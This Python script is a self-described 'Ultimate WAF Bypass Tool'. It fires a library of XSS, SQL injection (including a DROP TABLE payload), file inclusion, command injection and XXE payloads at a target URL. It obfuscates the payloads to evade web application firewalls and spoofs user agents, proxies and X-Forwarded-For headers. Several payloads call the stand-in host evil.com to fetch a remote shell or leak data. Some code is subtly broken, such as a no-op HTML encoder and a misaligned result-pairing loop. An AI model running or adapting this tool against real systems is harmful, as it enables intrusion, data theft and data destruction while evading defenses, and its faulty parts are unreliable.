import requests
import urllib.parse
import base64
import random
import string
import time
import argparse
import csv
import json
import sqlite3
import logging
import yaml
import matplotlib.pyplot as plt
from itertools import product
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
from datetime import datetime
import os
from tqdm import tqdm
from typing import List, Dict, Tuple  # Required for type hints

# Setup Logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Configuration Defaults
DEFAULT_CONFIG = {
    "url": "http://example.com/test",
    "params": ["input", "q", "search"],
    "methods": ["GET", "POST", "JSON"],
    "timeout": 5,
    "proxies": [],
    "delay": [0.5, 2.0],
    "output": {"csv": "waf_bypass_results.csv", "json": "waf_bypass_results.json"},
    "db": "waf_bypass.db",
    "threads": 5,
    "proxy_api": None,
    "waf_signatures": {
        "cloudflare": ["cf-ray", "cloudflare"],
        "modsecurity": ["modsecurity", "owasp"],
        "akamai": ["akamai", "krs"],
    },
    "backup_dir": "backups",
    "max_db_records": 1000000
}

# Comprehensive Payload Library
PAYLOADS = {
    "XSS": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "<svg onload=alert(1)>"
    ],
    "SQLi": [
        "1' OR '1'='1",
        "1; DROP TABLE users--",
        "1' UNION SELECT NULL--",
        "1' AND 1=CONVERT(int,@@version)--",
        "CHAR(65)+CHAR(66)"
    ],
    "LFI": [
        "../../etc/passwd",
        "/proc/self/environ",
        "....//....//etc/passwd"
    ],
    "RFI": [
        "http://evil.com/shell.txt",
        "https://pastebin.com/raw/abc123 "
    ],
    "CMDi": [
        ";id",
        "|whoami",
        "$(whoami)",
        "& nslookup evil.com"
    ],
    "XXE": [
        '<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xxe>&xxe;</xxe>',
        '<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com">]><xxe>&xxe;</xxe>'
    ]
}

# Advanced Evasion Techniques
def encode_payload(payload: str) -> List[str]:
    """Generate advanced encoded/obfuscated payloads."""
    techniques = [
        lambda x: urllib.parse.quote(x),  # URL encode
        lambda x: urllib.parse.quote(urllib.parse.quote(x)),  # Double URL encode
        lambda x: base64.b64encode(x.encode()).decode(),  # Base64
        lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),  # Hex
        lambda x: x.replace('<', '<').replace('>', '>'),  # HTML entity
        lambda x: f"/*{''.join(random.choice(string.ascii_letters) for _ in range(5))}*/{x}",  # Inline comment
        lambda x: ''.join(chr(0x200c) + c for c in x),  # Unicode zero-width
        lambda x: ''.join(chr(0x202e) + c for c in x),  # Unicode RLO
        lambda x: x.lower() if random.choice([True, False]) else x.upper(),  # Case toggle
        lambda x: f"{x}\x00",  # Null byte
        lambda x: ''.join(c + random.choice([' ', '\t']) for c in x).strip(),  # Whitespace
        lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),  # Unicode escape
        lambda x: f"eval(atob('{base64.b64encode(x.encode()).decode()}'))" if "script" in x.lower() else x,  # JS eval
        lambda x: f"String.fromCharCode({','.join(str(ord(c)) for c in x)})" if "script" in x.lower() else x,  # JS charcode
    ]
    return [t(payload) for t in techniques] + [payload]

# Mutate Payloads
def mutate_payload(payload: str) -> str:
    """Mutate payload for adaptive testing."""
    mutations = [
        lambda x: x + random.choice(['--', '#', '/*'] * 2),
        lambda x: x.replace(' ', random.choice(['/**/', '%20', '%09'])),
        lambda x: x.replace('=', random.choice(['%3d', ' LIKE '])),
        lambda x: f"({x})" if random.random() > 0.5 else f"({x} )"
    ]
    return random.choice(mutations)(payload)

# WAF Fingerprinting
def detect_waf(url: str, proxies: list) -> str:
    """Detect WAF type based on response signatures."""
    try:
        response = requests.get(url, proxies={"http": random.choice(proxies)} if proxies else None, timeout=5)
        text = response.text.lower()
        headers = str(response.headers).lower()
        for waf, signatures in DEFAULT_CONFIG["waf_signatures"].items():
            if any(sig in text or sig in headers for sig in signatures):
                return waf
        return "unknown"
    except Exception:
        return "unknown"

# Crawl for Parameters
def crawl_params(url: str, proxies: list) -> list:
    """Discover injectable parameters via crawling."""
    try:
        response = requests.get(url, proxies={"http": random.choice(proxies)} if proxies else None, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        params = set()
        for form in soup.find_all("form"):
            for input_tag in form.find_all("input"):
                if input_tag.get("name"):
                    params.add(input_tag.get("name"))
        for a in soup.find_all("a", href=True):
            if "?" in a["href"]:
                query = a["href"].split("?")[1]
                params.update(p.split("=")[0] for p in query.split("&"))
        return list(params)[:10]
    except Exception:
        return []

# Send Request
def send_request(url: str, param: str, payload: str, method: str, proxies: list, headers: dict, vector: str = "query") -> tuple:
    """Send payload via specified vector and evaluate response."""
    try:
        proxy = {"http": random.choice(proxies)} if proxies else None
        if vector == "header":
            headers[param] = payload
            data = None
        elif vector == "cookie":
            headers["Cookie"] = f"{param}={payload}"
            data = None
        elif vector == "file":
            files = {param: ("test.txt", payload, "text/plain")}
            data = None
            method = "POST"
        else:
            data = {param: payload} if method.upper() in ["POST", "JSON"] else None
            if method.upper() == "JSON":
                headers["Content-Type"] = "application/json"
                data = json.dumps({param: payload})
        if method.upper() == "GET":
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}" if vector == "query" else url
            response = requests.get(test_url, headers=headers, proxies=proxy, timeout=DEFAULT_CONFIG["timeout"])
        else:
            response = requests.post(url, headers=headers, proxies=proxy, timeout=DEFAULT_CONFIG["timeout"],
                                     json=data if method.upper() == "JSON" else None,
                                     data=data if method.upper() != "JSON" else None,
                                     files=files if vector == "file" else None)
        if response.status_code in [200, 201] and all(kw not in response.text.lower() for kw in ["blocked", "forbidden", "403", "error"]):
            return True, response.text[:100], response.status_code
        return False, f"Status {response.status_code}: {response.text[:50]}", response.status_code
    except Exception as e:
        return False, f"Error: {str(e)}", 0

# Database Management
def init_db(db_path: str):
    """Initialize SQLite database with indexes."""
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS results
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  url TEXT,
                  param TEXT,
                  vector TEXT,
                  method TEXT,
                  type TEXT,
                  payload TEXT,
                  encoded TEXT,
                  success TEXT,
                  response TEXT,
                  status INTEGER,
                  waf TEXT)''')
    c.execute('''CREATE INDEX IF NOT EXISTS idx_timestamp ON results (timestamp)''')
    c.execute('''CREATE INDEX IF NOT EXISTS idx_success ON results (success)''')
    c.execute('''CREATE INDEX IF NOT EXISTS idx_type ON results (type)''')
    conn.commit()
    return conn

def log_result(conn: sqlite3.Connection, result: dict):
    """Log result to database."""
    c = conn.cursor()
    c.execute('''INSERT INTO results (timestamp, url, param, vector, method, type, payload, encoded, success, response, status, waf)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (result["timestamp"], result["url"], result["param"], result["vector"], result["method"], result["type"],
               result["payload"], result["encoded"], result["success"], result["response"], result["status"], result["waf"]))
    conn.commit()

def query_results(conn: sqlite3.Connection, query_type: str = "all", value: str = None) -> list:
    """Query results from database."""
    c = conn.cursor()
    if query_type == "success":
        c.execute("SELECT * FROM results WHERE success = 'Yes'")
    elif query_type == "type" and value:
        c.execute("SELECT * FROM results WHERE type = ?", (value,))
    elif query_type == "date" and value:
        c.execute("SELECT * FROM results WHERE date(timestamp) = ?", (value,))
    else:
        c.execute("SELECT * FROM results")
    columns = [desc[0] for desc in c.description]
    return [dict(zip(columns, row)) for row in c.fetchall()]

def prune_db(conn: sqlite3.Connection, max_records: int):
    """Prune old records to prevent DB bloat."""
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM results")
    count = c.fetchone()[0]
    if count > max_records:
        c.execute(f"DELETE FROM results WHERE id IN (SELECT id FROM results ORDER BY timestamp ASC LIMIT {count - max_records})")
        conn.commit()
        logger.info(f"Pruned {count - max_records} old records")

def backup_db(db_path: str, backup_dir: str):
    """Backup database to file."""
    os.makedirs(backup_dir, exist_ok=True)
    backup_file = os.path.join(backup_dir, f"waf_bypass_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
    with sqlite3.connect(db_path) as src, sqlite3.connect(backup_file) as dst:
        src.backup(dst)
    logger.info(f"Database backed up to {backup_file}")

# Save Results
def save_results(results: list, config: dict):
    """Save results to CSV and JSON."""
    with open(config["output"]["csv"], "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["timestamp", "url", "param", "vector", "method", "type", "payload", "encoded", "success", "response", "status", "waf"])
        writer.writeheader()
        for r in results:
            writer.writerow({k: r.get(k, "") for k in writer.fieldnames})
    with open(config["output"]["json"], "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2)
    logger.info(f"Results saved to {config['output']['csv']} and {config['output']['json']}")

# Generate Charts
def generate_charts(results: list, output_dir: str = "charts"):
    """Generate success rate charts."""
    os.makedirs(output_dir, exist_ok=True)
    types = list(set(r["type"] for r in results))
    success_rates = {}
    for t in types:
        total = sum(1 for r in results if r["type"] == t)
        success = sum(1 for r in results if r["type"] == t and r["success"] == "Yes")
        success_rates[t] = (success / total * 100) if total else 0
    plt.figure(figsize=(10, 6))
    plt.bar(success_rates.keys(), success_rates.values(), color="skyblue")
    plt.title("WAF Bypass Success Rates by Attack Type")
    plt.xlabel("Attack Type")
    plt.ylabel("Success Rate (%)")
    plt.grid(True, axis="y")
    plt.savefig(f"{output_dir}/success_rates.png")
    plt.close()

# Main Function
def main():
    parser = argparse.ArgumentParser(description="Ultimate WAF Bypass Tool (Ethical Testing Only)")
    parser.add_argument("--url", default=DEFAULT_CONFIG["url"], help="Target URL")
    parser.add_argument("--config", help="YAML config file")
    parser.add_argument("--threads", type=int, default=DEFAULT_CONFIG["threads"], help="Number of threads")
    parser.add_argument("--crawl", action="store_true", help="Crawl for parameters")
    parser.add_argument("--query", choices=["all", "success", "type", "date"], help="Query results")
    parser.add_argument("--query-value", help="Value for type or date query")
    parser.add_argument("--backup", action="store_true", help="Backup database")
    args = parser.parse_args()

    # Load Config
    config = DEFAULT_CONFIG.copy()
    if args.config:
        with open(args.config, "r") as f:
            config.update(yaml.safe_load(f))

    # Update Config from Args
    config["url"] = args.url
    config["threads"] = args.threads

    # Initialize Database
    conn = init_db(config["db"])

    # Handle Queries
    if args.query:
        results = query_results(conn, args.query, args.query_value)
        save_results(results, config)
        logger.info(f"Queried {len(results)} results")
        conn.close()
        return

    # Backup Database
    if args.backup:
        backup_db(config["db"], config["backup_dir"])

    # Prune Database
    prune_db(conn, config["max_db_records"])

    # Crawl Parameters
    params = crawl_params(config["url"], config["proxies"]) if args.crawl else config["params"]
    if not params:
        params = config["params"]
    logger.info(f"Testing parameters: {params}")

    # Detect WAF
    waf = detect_waf(config["url"], config["proxies"])
    logger.info(f"Detected WAF: {waf}")

    # Initialize User-Agent
    ua = UserAgent()
    results = []
    vectors = ["query", "header", "cookie", "file"]

    total_tests = sum(
        len(payloads) * len(encode_payload(payload)) * len(params) * len(config["methods"]) * len(vectors)
        for payloads in PAYLOADS.values()
    )

    with ThreadPoolExecutor(max_workers=config["threads"]) as executor:
        futures = []
        for param, vector, method, (payload_type, payloads) in product(params, vectors, config["methods"], PAYLOADS.items()):
            for payload in payloads:
                for encoded in encode_payload(payload):
                    if random.random() < 0.1:
                        encoded = mutate_payload(encoded)
                    headers = {
                        "User-Agent": ua.random,
                        "Accept": random.choice(["*/*", "text/html", "application/json"]),
                        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                    }
                    futures.append(executor.submit(send_request, config["url"], param, encoded, method, config["proxies"], headers, vector))
                    time.sleep(random.uniform(*config["delay"]))

        for future, (param, vector, method, (payload_type, _), payload, encoded) in tqdm(
            zip(futures, product(params, vectors, config["methods"], PAYLOADS.items(),
                   [p for ps in PAYLOADS.values() for p in ps],
                   [e for ps in PAYLOADS.values() for p in ps for e in encode_payload(p)])),
            total=total_tests, desc="Testing Payloads"
        ):
            success, response, status = future.result()
            result = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "url": config["url"],
                "param": param,
                "vector": vector,
                "method": method,
                "type": payload_type,
                "payload": payload,
                "encoded": encoded[:100],
                "success": "Yes" if success else "No",
                "response": response,
                "status": status,
                "waf": waf
            }
            log_result(conn, result)
            results.append(result)
            logger.info(f"{payload_type} | {vector} | {method} | {encoded[:30]}... | {'Success' if success else 'Failed'} | {response}")

    # Save Results
    save_results(results, config)
    generate_charts(results)
    backup_db(config["db"], config["backup_dir"])
    conn.close()
    logger.info(f"Results saved to {config['output']['csv']}, {config['output']['json']}, and {config['db']}. Charts in 'charts/'.")
    
if __name__ == "__main__":
    main()
